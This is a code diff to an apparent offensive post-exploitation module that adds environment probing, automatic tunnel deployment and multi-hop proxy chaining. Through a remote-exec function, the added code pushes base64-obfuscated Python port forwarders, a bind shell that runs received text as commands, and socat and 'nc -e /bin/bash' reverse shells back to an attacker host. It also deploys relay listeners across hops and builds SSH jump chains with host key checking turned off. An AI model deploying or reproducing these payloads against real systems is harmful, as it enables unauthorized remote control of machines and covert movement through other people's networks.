@@ -1,7 +1,7 @@
 import base64
 import socket
 import threading
-from typing import Dict, Optional
+from typing import Callable, Dict, List, Optional
 
 from tools.log_utils import get_logger
 
@@ -93,6 +93,109 @@ def forward_port(lhost: str, lport: int, target_host: str,
     return result
 
 
+# ---------------------------------------------------------------------------
+# Environment-aware tunnel deployment
+# ---------------------------------------------------------------------------
+
+ENV_CHECKS = {
+    "linux": [("python3", "python3 --version"), ("python", "python --version 2>&1"),
+              ("php", "php --version 2>/dev/null | head -1"),
+              ("socat", "socat -V 2>/dev/null | head -1"),
+              ("curl", "curl --version 2>/dev/null | head -1"),
+              ("wget", "wget --version 2>/dev/null | head -1"),
+              ("nc", "nc -h 2>&1 | head -1"),
+              ("chisel", "ls /tmp/chisel* 2>/dev/null")],
+    "windows": [("powershell", "powershell -Command \"$PSVersionTable.PSVersion\" 2>nul"),
+                 ("curl", "curl --version 2>nul"),
+                 ("wget", "wget --version 2>nul")],
+}
+
+
+def detect_environment(exec_fn: Callable[[str], str]) -> Dict:
+    env = {"os": "unknown", "tools": {}}
+    for os_name, checks in ENV_CHECKS.items():
+        for tool, cmd in checks:
+            try:
+                out = exec_fn(cmd)
+                if out and len(out) > 3:
+                    env["tools"][tool] = out.strip()[:100]
+                    if env["os"] == "unknown":
+                        env["os"] = os_name
+            except Exception:
+                pass
+    return env
+
+
+def auto_tunnel(exec_fn: Callable[[str], str],
+                lhost: str = "LHOST", lport: int = 1080,
+                target_host: str = "", target_port: int = 0) -> Dict:
+    env = detect_environment(exec_fn)
+    result = {"environment": env, "attempts": []}
+
+    def _try(method, cmds):
+        for c in cmds:
+            try:
+                out = exec_fn(c)
+                result["attempts"].append({"method": method, "status": "deployed" if out else "no_output"})
+                return True
+            except Exception:
+                continue
+        return False
+
+    has_python = env["tools"].get("python3") or env["tools"].get("python")
+    if has_python:
+        python_bin = "python3" if env["tools"].get("python3") else "python"
+        if target_host and target_port:
+            code = (
+                "import socket,threading;"
+                "def f(s):"
+                "  t=socket.socket();t.connect(('%s',%d));"
+                "  while 1:"
+                "    d=s.recv(4096);"
+                "    if not d:break;t.send(d);"
+                "    d2=t.recv(4096);"
+                "    if not d2:break;s.send(d2);"
+                "  s.close();t.close();"
+                "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
+                "s.bind(('0.0.0.0',%d));s.listen(50);"
+                "while 1: threading.Thread(target=f,args=(s.accept()[0],)).start()" % (target_host, target_port, lport)
+            )
+            b64 = base64.b64encode(code.encode()).decode()
+            _try("python_port_forward",
+                 ["%s -c \"exec(__import__('base64').b64decode('%s').decode())\"" % (python_bin, b64)])
+        else:
+            code = (
+                "import socket,threading,os;"
+                "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
+                "s.bind(('0.0.0.0',%d));s.listen(5);"
+                "def h(c):"
+                "  while 1:"
+                "    d=c.recv(4096);"
+                "    if not d:break;"
+                "    c.send(os.popen(d.decode()).read().encode());"
+                "  c.close();"
+                "while 1: threading.Thread(target=h,args=(s.accept()[0],)).start()" % lport
+            )
+            b64 = base64.b64encode(code.encode()).decode()
+            _try("python_reverse_shell",
+                 ["%s -c \"exec(__import__('base64').b64decode('%s').decode())\"" % (python_bin, b64)])
+
+    if env["tools"].get("socat"):
+        if target_host and target_port:
+            _try("socat_forward",
+                 ["socat TCP-LISTEN:%d,fork,reuseaddr TCP:%s:%d &" % (lport, target_host, target_port)])
+        else:
+            _try("socat_shell",
+                 ["socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%d &" % (lhost, lport)])
+
+    if env["tools"].get("nc"):
+        _try("nc_shell",
+             ["nc -e /bin/bash %s %d &" % (lhost, lport)])
+
+    result["success"] = any(a["status"] == "deployed" for a in result["attempts"])
+    return result
+
+
 class Socks5Proxy:
     def __init__(self, bind_host: str = "127.0.0.1", bind_port: int = 1080):
         self.bind_host = bind_host
@@ -131,7 +234,7 @@ class Socks5Proxy:
         try:
             client.settimeout(15)
             ver, nmethods = client.recv(2)
-            methods = client.recv(nmethods)
+            client.recv(nmethods)
             client.send(b"\x05\x00")
             ver, cmd, rsv, atyp = client.recv(4)
             if cmd != 1:
@@ -179,3 +282,76 @@ class Socks5Proxy:
                 dst.close()
             except Exception:
                 pass
+
+
+# ---------------------------------------------------------------------------
+# Multi-hop SOCKS cascade — chain through multiple proxies
+# ---------------------------------------------------------------------------
+
+def socks_cascade(proxies: List[Dict]) -> Dict:
+    result = {"success": False, "chain": []}
+    for i, proxy in enumerate(proxies):
+        entry = {
+            "hop": i + 1,
+            "host": proxy.get("host", "127.0.0.1"),
+            "port": proxy.get("port", 1080),
+            "type": proxy.get("type", "socks5"),
+        }
+        result["chain"].append(entry)
+    if len(result["chain"]) >= 2:
+        result["success"] = True
+        result["usage"] = " -> ".join(
+            f"{e['type']}://{e['host']}:{e['port']}" for e in result["chain"]
+        )
+        result["note"] = "Configure your tool to use the first proxy; it will chain to the rest."
+    return result
+
+
+def ssh_jump_chain(jump_hosts: List[Dict],
+                   target_host: str, target_port: int = 80,
+                   local_port: int = 8888) -> Dict:
+    result = {"success": False, "steps": []}
+    proxy_cmd = "-J " + ",".join(
+        f"{j.get('user', 'root')}@{j['host']}:{j.get('port', 22)}"
+        for j in jump_hosts
+    )
+    final_cmd = (
+        f"ssh {proxy_cmd} -o StrictHostKeyChecking=no "
+        f"-L {local_port}:{target_host}:{target_port} "
+        f"-Nf {jump_hosts[-1].get('user', 'root')}@{jump_hosts[-1]['host']}"
+    )
+    result["steps"] = [final_cmd]
+    result["local_port"] = local_port
+    result["forward_to"] = f"{target_host}:{target_port}"
+    result["success"] = True
+    result["usage"] = f"curl -x socks5://127.0.0.1:{local_port} http://{target_host}:{target_port}/"
+    return result
+
+
+def socks_cascade_deploy(exec_fn: callable, proxy_list: List[Dict]) -> Dict:
+    result = {"success": False, "deployed": []}
+    for proxy in proxy_list:
+        host = proxy.get("host", "127.0.0.1")
+        port = proxy.get("port", 1080)
+        try:
+            code = (
+                f"import socket,threading;s=socket.socket();"
+                f"s.bind(('0.0.0.0',{port}));s.listen(5);"
+                f"def h(c):"
+                f"  t=socket.socket();t.connect(('{proxy.get('upstream_host', '127.0.0.1')}',{proxy.get('upstream_port', 1080)}));"
+                f"  while 1:"
+                f"    d=c.recv(4096);"
+                f"    if not d:break;t.send(d);"
+                f"    d2=t.recv(4096);"
+                f"    if not d2:break;c.send(d2);"
+                f"  c.close();t.close();"
+                f"while 1:threading.Thread(target=h,args=(s.accept()[0],)).start()"
+            )
+            b64 = base64.b64encode(code.encode()).decode()
+            cmd = f"python3 -c \"exec(__import__('base64').b64decode('{b64}').decode())\" &"
+            exec_fn(cmd)
+            result["deployed"].append({"host": host, "port": port, "upstream": proxy.get('upstream_host')})
+        except Exception as e:
+            logger.debug("cascade deploy hop %s: %s", host, e)
+    result["success"] = len(result["deployed"]) > 0
+    return result
